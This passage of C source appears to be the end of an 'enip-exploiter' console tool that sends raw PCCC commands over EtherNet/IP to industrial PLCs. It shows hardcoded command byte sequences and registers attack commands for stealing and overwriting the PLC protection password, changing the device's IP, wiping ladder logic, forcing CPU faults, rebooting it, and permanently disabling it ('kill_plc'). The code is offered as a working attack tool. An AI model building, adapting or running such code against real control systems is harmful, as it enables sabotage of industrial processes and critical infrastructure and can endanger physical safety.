    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command0, 14);
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Unable to clear CPU fault");
        return CLI_ERROR;
    }
    
    char pccc_command1[] = {0x0f, 0x00, 0x01, 0x08, 0xaa, 0x02, 0x02, 0x84, 0x06, 0x00, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command1, 12);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Unable to clear CPU fault");
        return CLI_ERROR;
    }
    
    char pccc_command2[] = {0x0f, 0x00, 0x01, 0x08, 0xab, 0x02, 0x02, 0x84, 0x01, 0x00, 0x00, 0x20, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command2, 14);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Unable to clear CPU fault");
        return CLI_ERROR;
    }
}

int idle_timeout(struct cli_def *cli) 
{
    //cli_print(cli, "Custom idle timeout");
    return CLI_OK;
}

int main() 
{
    signal(SIGCHLD, SIG_IGN);

    cli = cli_init();
    cli_set_banner(cli, "enip-exploiter console");
    cli_set_hostname(cli, "enip-exploiter");
    cli_telnet_protocol(cli, 0);
    cli_set_idle_timeout_callback(cli, 60, idle_timeout);  // 60 second idle timeout
    
    cli_unregister_command(cli, "logout");
    cli_unregister_command(cli, "enable");
    cli_unregister_command(cli, "quit");
    
    //cli_register_command(cli, NULL, "test", cmd_test, PRIVILEGE_UNPRIVILEGED, MODE_EXEC, NULL);
    cli_register_command(cli, NULL, "connect", establish_enip_connection, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Connect to an EtherNet/IP Device");
    cli_register_command(cli, NULL, "get_device_info", get_device_info, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Retrieve device information");
    cli_register_command(cli, NULL, "start_plc", start_plc, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Places PLC in RUN mode");
    cli_register_command(cli, NULL, "stop_plc", stop_plc, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Places PLC in PROG mode");
    cli_register_command(cli, NULL, "send_raw_pccc", send_raw_pccc, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Send raw PCCC messages to a connected device");
    cli_register_command(cli, NULL, "read_password", read_password, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Retrieve protection password from PLC");
    cli_register_command(cli, NULL, "write_password", write_password, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Overwrite protection password on PLC");
    cli_register_command(cli, NULL, "change_ip", change_ip, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Change PLC's IP Address");
    cli_register_command(cli, NULL, "wipe_memory", wipe_memory, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Erase PLC ladder logic files");
    cli_register_command(cli, NULL, "reboot_plc", reboot_plc, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Send an SNMP packet that reboots the PLC");
    cli_register_command(cli, NULL, "enable_protocols", enable_protocols, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Enable SNMP, Modbus and HTTP");
    cli_register_command(cli, NULL, "force_cpu_fault", force_cpu_fault, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Generate a CPU fault by triggering HSC error and auto-start bits");
    cli_register_command(cli, NULL, "clear_cpu_fault", clear_cpu_fault, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Clear all CPU faults");
    cli_register_command(cli, NULL, "kill_plc", kill_plc, PRIVILEGE_UNPRIVILEGED, MODE_ANY, "Transforms PLC into a brick");

    cli_start();
    
    while(1) {}
}
